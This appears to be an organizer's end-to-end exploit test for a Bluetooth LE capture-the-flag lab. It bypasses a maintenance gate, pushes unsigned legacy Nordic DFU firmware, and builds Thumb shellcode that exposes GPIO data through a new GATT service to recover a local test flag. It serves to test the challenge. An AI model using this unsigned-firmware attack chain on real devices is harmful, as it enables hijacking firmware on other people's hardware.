#!/usr/bin/env python3
"""Organizer-only end-to-end exploit smoke test for the extracted player lab.

This file is intentionally excluded from both release ZIPs.  CI copies it into
the already-verified extracted attachment, then proves that a player script can
cross the maintenance gate, perform unsigned legacy DFU, execute Thumb code,
register a new GATT service, and recover the local test flag through Rootcanal.
"""

from __future__ import annotations

import argparse
import asyncio
from binascii import crc_hqx
from contextlib import suppress
import struct
import time

from bumble.core import UUID
from bumble.device import Device, Peer
from bumble.hci import Address
from bumble.transport import open_transport

from field_node.gatt_ids import (
    CONTROL_POINT_UUID,
    MAINTENANCE_CONTROL_UUID,
    MAINTENANCE_SERVICE_UUID,
    PACKET_UUID,
    SERVICE_UUID,
    DfuOpcode,
)


TARGET_ADDRESS = Address("F6:F7:F8:F9:FA:FB")
MAINTENANCE_REQUEST = bytes.fromhex("11451419198100")
EXPECTED_LOCAL_FLAG = b"CTF{local_emulator_test_flag}\n"
GPIO_P0_IN = 0x5000_0510
EXPLOIT_SERVICE_UUID = "5a1c2001-7c5d-4c8d-942c-a786c1d58b6d"
EXPLOIT_VALUE_UUID = "5a1c2002-7c5d-4c8d-942c-a786c1d58b6d"
APPLICATION_IMAGE_TYPE = 0x04
DFU_SUCCESS = 0x01


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser()
    parser.add_argument("--transport", default="tcp-client:host:6402")
    return parser.parse_args()


def make_init_packet(image: bytes) -> bytes:
    """Build the unsigned SDK 11 application init packet used by the smoke test."""

    return struct.pack(
        "<HHIHHH",
        0xFFFF,
        0xFFFF,
        0,
        1,
        0xFFFE,
        crc_hqx(image, 0xFFFF),
    ) + b"\x00\x00"


def make_flag_payload(bytes_to_read: int) -> bytes:
    """Build Cortex-M0 firmware that publishes GPIO words in its own GATT service."""

    if bytes_to_read <= 0 or bytes_to_read % 4:
        raise ValueError("bytes_to_read must be a positive multiple of four")
    application_base = 0x0001_B000
    code_offset = 0x100
    code_address = application_base + code_offset
    flag_buffer = 0x2000_0100
    uuid_type_output = 0x2000_0080
    service_handle_output = 0x2000_0082
    characteristic_handles_output = 0x2000_0084

    instructions: list[int] = []
    literal_uses: list[tuple[int, int, str]] = []

    def literal(register: int, label: str) -> None:
        literal_uses.append((len(instructions), register, label))
        instructions.append(0)

    literal(0, "gpio")
    literal(1, "flag_buffer")
    instructions.extend(
        (0x2200 | (bytes_to_read // 4), 0x6803, 0x600B, 0x3104, 0x3A01, 0xD1FA)
    )
    literal(0, "base_uuid")
    literal(1, "uuid_type_output")
    instructions.extend((0xDF63, 0x2001))
    literal(1, "service_uuid")
    literal(2, "service_handle_output")
    instructions.append(0xDFA0)
    literal(0, "service_handle_output")
    instructions.append(0x8800)
    literal(1, "char_md")
    literal(2, "attribute")
    literal(3, "characteristic_handles_output")
    instructions.extend((0xDFA2, 0xE7FE))

    code = bytearray(struct.pack(f"<{len(instructions)}H", *instructions))
    while len(code) % 4:
        code.extend(b"\x00")
    literal_pool_offset = code_offset + len(code)
    labels = (
        "gpio",
        "flag_buffer",
        "base_uuid",
        "uuid_type_output",
        "service_uuid",
        "service_handle_output",
        "char_md",
        "attribute",
        "characteristic_handles_output",
    )
    literal_offsets = {
        label: literal_pool_offset + index * 4 for index, label in enumerate(labels)
    }
    data_offset = literal_pool_offset + 4 * len(labels)
    base_uuid_offset = data_offset
    service_uuid_offset = base_uuid_offset + 16
    value_uuid_offset = service_uuid_offset + 4
    char_md_offset = value_uuid_offset + 4
    attr_md_offset = char_md_offset + 4
    attribute_offset = attr_md_offset + 4
    addresses = {
        "gpio": GPIO_P0_IN,
        "flag_buffer": flag_buffer,
        "base_uuid": application_base + base_uuid_offset,
        "uuid_type_output": uuid_type_output,
        "service_uuid": application_base + service_uuid_offset,
        "service_handle_output": service_handle_output,
        "char_md": application_base + char_md_offset,
        "attribute": application_base + attribute_offset,
        "characteristic_handles_output": characteristic_handles_output,
    }
    for label in labels:
        code.extend(struct.pack("<I", addresses[label]))
    for index, register, label in literal_uses:
        instruction_address = code_address + index * 2
        pc = (instruction_address + 4) & ~3
        displacement = application_base + literal_offsets[label] - pc
        struct.pack_into(
            "<H", code, index * 2, 0x4800 | (register << 8) | (displacement // 4)
        )

    data = bytearray(bytes.fromhex("6d8bd5c186a72c948d4c5d7c00001c5a"))
    data.extend(struct.pack("<HBx", 0x2001, 2))
    data.extend(struct.pack("<HBx", 0x2002, 2))
    data.extend(b"\x02\x00\x00\x00")
    data.extend(b"\x01\x00\x00\x00")
    data.extend(
        struct.pack(
            "<IIHHH2xI",
            application_base + value_uuid_offset,
            application_base + attr_md_offset,
            bytes_to_read,
            0,
            bytes_to_read,
            flag_buffer,
        )
    )
    vector_table = struct.pack("<II", 0x2000_8000, code_address + 1)
    image = (
        vector_table
        + b"\xff" * (code_offset - len(vector_table))
        + bytes(code)
        + bytes(data)
    )
    return image + b"\xff" * (-len(image) % 4)


async def reconnect(device: Device, timeout: float = 20.0):
    deadline = time.monotonic() + timeout
    last_error: Exception | None = None
    while time.monotonic() < deadline:
        try:
            return await device.connect(TARGET_ADDRESS, timeout=1)
        except Exception as exc:
            last_error = exc
            await asyncio.sleep(0.05)
    raise TimeoutError("target did not advertise again") from last_error


async def expect_notification(
    queue: asyncio.Queue[bytes], expected: bytes, timeout: float = 10.0
) -> None:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        received = bytes(
            await asyncio.wait_for(
                queue.get(),
                timeout=max(0.01, deadline - time.monotonic()),
            )
        )
        if received == expected:
            return
    raise TimeoutError(f"notification not received: {expected.hex()}")


async def run(args: argparse.Namespace) -> bytes:
    image = make_flag_payload(32)
    if len(image) % 4:
        raise RuntimeError("smoke payload is not word-aligned")

    async with await open_transport(args.transport) as transport:
        device = Device.with_hci(
            "attachment-exploit-smoke",
            Address("F0:F1:F2:F3:F4:F5"),
            transport.source,
            transport.sink,
        )
        connections = []
        try:
            await device.power_on()

            initial = await device.connect(TARGET_ADDRESS, timeout=15)
            connections.append(initial)
            initial_disconnected = asyncio.Event()
            initial.on(
                initial.EVENT_DISCONNECTION,
                lambda *_args: initial_disconnected.set(),
            )
            initial_peer = Peer(initial)
            maintenance_services = await initial_peer.discover_service(
                UUID(MAINTENANCE_SERVICE_UUID)
            )
            if len(maintenance_services) != 1:
                raise RuntimeError("maintenance service not found")
            await initial_peer.discover_characteristics(service=maintenance_services[0])
            maintenance_control = initial_peer.get_characteristics_by_uuid(
                UUID(MAINTENANCE_CONTROL_UUID), maintenance_services[0]
            )[0]
            await initial_peer.write_value(
                maintenance_control,
                MAINTENANCE_REQUEST,
                with_response=True,
            )
            await asyncio.wait_for(initial_disconnected.wait(), timeout=10)

            dfu = await reconnect(device)
            connections.append(dfu)
            dfu_disconnected = asyncio.Event()
            dfu.on(dfu.EVENT_DISCONNECTION, lambda *_args: dfu_disconnected.set())
            dfu_peer = Peer(dfu)
            dfu_services = await dfu_peer.discover_service(UUID(SERVICE_UUID))
            if len(dfu_services) != 1:
                raise RuntimeError("legacy DFU service not found after reset")
            await dfu_peer.discover_characteristics(service=dfu_services[0])
            control = dfu_peer.get_characteristics_by_uuid(
                UUID(CONTROL_POINT_UUID), dfu_services[0]
            )[0]
            packet = dfu_peer.get_characteristics_by_uuid(
                UUID(PACKET_UUID), dfu_services[0]
            )[0]
            notifications: asyncio.Queue[bytes] = asyncio.Queue()
            await dfu_peer.subscribe(control, notifications.put_nowait)

            await dfu_peer.write_value(
                control,
                bytes((DfuOpcode.START_DFU, APPLICATION_IMAGE_TYPE)),
                with_response=True,
            )
            await dfu_peer.write_value(packet, struct.pack("<III", 0, 0, len(image)))
            await expect_notification(
                notifications,
                bytes((DfuOpcode.RESPONSE_CODE, DfuOpcode.START_DFU, DFU_SUCCESS)),
            )

            init_packet = make_init_packet(image)
            await dfu_peer.write_value(
                control,
                bytes((DfuOpcode.INITIALIZE_DFU_PARAMETERS, 0)),
                with_response=True,
            )
            await dfu_peer.write_value(packet, init_packet)
            await dfu_peer.write_value(
                control,
                bytes((DfuOpcode.INITIALIZE_DFU_PARAMETERS, 1)),
                with_response=True,
            )
            await expect_notification(
                notifications,
                bytes(
                    (
                        DfuOpcode.RESPONSE_CODE,
                        DfuOpcode.INITIALIZE_DFU_PARAMETERS,
                        DFU_SUCCESS,
                    )
                ),
            )

            await dfu_peer.write_value(
                control,
                bytes((DfuOpcode.PACKET_RECEIPT_NOTIFICATION_REQUEST, 1, 0)),
                with_response=True,
            )
            await dfu_peer.write_value(
                control,
                bytes((DfuOpcode.RECEIVE_FIRMWARE_IMAGE,)),
                with_response=True,
            )
            for offset in range(0, len(image), 20):
                await dfu_peer.write_value(packet, image[offset : offset + 20])
            await expect_notification(
                notifications,
                bytes(
                    (
                        DfuOpcode.RESPONSE_CODE,
                        DfuOpcode.RECEIVE_FIRMWARE_IMAGE,
                        DFU_SUCCESS,
                    )
                ),
            )

            await dfu_peer.write_value(
                control,
                bytes((DfuOpcode.VALIDATE_FIRMWARE,)),
                with_response=True,
            )
            await expect_notification(
                notifications,
                bytes(
                    (
                        DfuOpcode.RESPONSE_CODE,
                        DfuOpcode.VALIDATE_FIRMWARE,
                        DFU_SUCCESS,
                    )
                ),
            )
            await dfu_peer.write_value(
                control,
                bytes((DfuOpcode.ACTIVATE_AND_RESET,)),
                with_response=True,
            )
            await asyncio.wait_for(dfu_disconnected.wait(), timeout=10)

            application = await reconnect(device)
            connections.append(application)
            application_peer = Peer(application)
            exploit_services = await application_peer.discover_service(
                UUID(EXPLOIT_SERVICE_UUID)
            )
            if len(exploit_services) != 1:
                raise RuntimeError("payload-created service not found after reset")
            await application_peer.discover_characteristics(service=exploit_services[0])
            output = application_peer.get_characteristics_by_uuid(
                UUID(EXPLOIT_VALUE_UUID), exploit_services[0]
            )[0]
            recovered = bytes(await application_peer.read_value(output)).rstrip(b"\x00")
            if recovered != EXPECTED_LOCAL_FLAG:
                raise RuntimeError(f"unexpected payload GATT value: {recovered!r}")
            return recovered
        finally:
            for connection in reversed(connections):
                with suppress(Exception):
                    await connection.disconnect()
            with suppress(Exception):
                await device.power_off()


def main() -> int:
    recovered = asyncio.run(run(parse_args()))
    print(f"local exploit OK: recovered {recovered!r}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
